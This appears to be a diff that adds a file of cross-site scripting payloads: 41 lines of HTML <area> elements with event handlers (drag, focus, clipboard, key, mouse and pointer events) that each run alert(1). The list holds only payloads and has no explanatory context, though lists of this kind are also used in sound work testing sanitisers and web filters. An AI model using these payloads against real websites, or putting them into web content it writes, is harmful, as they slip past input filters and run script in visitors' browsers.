@@ -1,0 +1,41 @@
+<area draggable="true" ondrag="alert(1)">test</area>
+<area draggable="true" ondragend="alert(1)">test</area>
+<area draggable="true" ondragenter="alert(1)">test</area>
+<area draggable="true" ondragleave="alert(1)">test</area>
+<area draggable="true" ondragstart="alert(1)">test</area>
+<area id=x tabindex=1 onactivate=alert(1)></area>
+<area id=x tabindex=1 onbeforeactivate=alert(1)></area>
+<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
+<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
+<area onafterscriptexecute=alert(1)><script>1</script>
+<area onbeforecopy="alert(1)" contenteditable>test</area>
+<area onbeforecut="alert(1)" contenteditable>test</area>
+<area onbeforepaste="alert(1)" contenteditable>test</area>
+<area onbeforescriptexecute=alert(1)><script>1</script>
+<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
+<area onclick="alert(1)">test</area>
+<area oncontextmenu="alert(1)">test</area>
+<area oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<area oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<area ondblclick="alert(1)" autofocus tabindex=1>test</area>
+<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
+<area onkeydown="alert(1)" contenteditable>test</area>
+<area onkeypress="alert(1)" contenteditable>test</area>
+<area onkeyup="alert(1)" contenteditable>test</area>
+<area onmousedown="alert(1)">test</area>
+<area onmouseenter="alert(1)">test</area>
+<area onmouseleave="alert(1)">test</area>
+<area onmousemove="alert(1)">test</area>
+<area onmouseout="alert(1)">test</area>
+<area onmouseover="alert(1)">test</area>
+<area onmouseup="alert(1)">test</area>
+<area onmousewheel=alert(1)>requires scrolling
+<area onpaste="alert(1)" contenteditable>test</area>
+<area onpointerdown=alert(1)>XSS</area>
+<area onpointerenter=alert(1)>XSS</area>
+<area onpointerleave=alert(1)>XSS</area>
+<area onpointermove=alert(1)>XSS</area>
+<area onpointerout=alert(1)>XSS</area>
+<area onpointerover=alert(1)>XSS</area>
+<area onpointerrawupdate=alert(1)>XSS</area>
+<area onpointerup=alert(1)>XSS</area>
